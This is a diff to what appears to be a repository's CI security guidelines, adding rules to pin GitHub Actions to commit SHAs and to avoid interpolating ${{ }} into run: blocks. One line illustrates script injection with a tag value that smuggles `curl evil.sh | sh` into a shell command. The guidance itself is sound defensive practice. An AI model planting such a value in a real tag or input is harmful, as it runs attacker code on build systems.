@@ -19,4 +19,15 @@
 - A job whose secret is unset must **skip**, not fail. A red build for a missing
   optional token trains people to ignore red builds, which is worse than the scan
   it was meant to enforce.
-- Pin actions to a known-good major version; bump promptly if one is deprecated.
+- **Pin every action to a full 40-character commit SHA**, with the version in a
+  trailing comment (`uses: actions/checkout@9c091bb... # v7.0.0`). A tag is mutable:
+  the owner can repoint `@v7` at anything, and that is precisely how the
+  `tj-actions/changed-files` and `trivy-action` compromises reached everyone
+  downstream. A SHA cannot be repointed. Bump promptly if an action is deprecated,
+  and re-resolve the SHA when you do.
+- **Never interpolate `${{ }}` into a `run:` block.** Pass the value through `env:`
+  and read it as a shell variable. Anything derived from a branch name, tag, title
+  or comment is attacker-supplied text, and interpolation pastes it into the script
+  before bash ever sees it: a tag named `'; curl evil.sh | sh; '` executes.
+- Semgrep enforces both of the above, and caught both in this repo's own first
+  workflow. If it fires on the CI config, fix the config; do not silence the rule.
